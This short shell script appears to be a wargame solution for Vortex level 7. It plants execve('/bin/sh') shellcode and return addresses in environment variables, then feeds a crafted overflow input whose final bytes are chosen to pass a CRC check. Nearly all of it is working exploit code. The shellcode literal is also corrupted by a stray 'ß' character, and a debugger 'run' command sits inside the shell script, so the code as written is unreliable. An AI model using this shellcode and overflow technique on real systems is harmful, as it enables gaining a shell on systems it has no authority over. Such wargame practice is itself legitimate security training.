# !/bin/sh
# We have to create a payload that will run the shell code and also pass the CRC check

mkdir /tmp/ballban_vortex7
cd /tmp/ballban_vortex7

# Set env
# unset $(env | cut -d= -f1)  # cleanup envs
# export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
export EGG=$(python3 -c "import sys; sys.stdout.buffer.write(b'\x90' * 4 + b'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6ßa\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80')")
export EGG2=$(python3 -c "import sys; import struct; sys.stdout.buffer.write(b'aa' + struct.pack('<I', 0xffffddd8) * 10)")

# Create check_env.c and compile
nano check_env.c
gcc -m32 check_env.c -o check_env

# Check address of EGG
./check_env EGG

# Check address of EGG2
./check_env EGG2


/vortex/vortex7 

run $(python3 -c 'import sys; import struct; sys.stdout.buffer.write(b"=\xdd\xff\xff=\xdd\xff\xff=\xdd\xff\xff=\xdd\xff\xff=\xdd\xff\xff=\xdd\xff\xff=\xdd\xff\xff=\xdd\xff\xff=\xdd\xff\xff=\xdd\xff\xff=\xdd\xff\xff=\xdd\xff\xff=\xdd\xff\xff=\xdd\xff\xff=\xdd\xff\xff=\xdd\xff\xff\xfa\x04\xca\xa6")')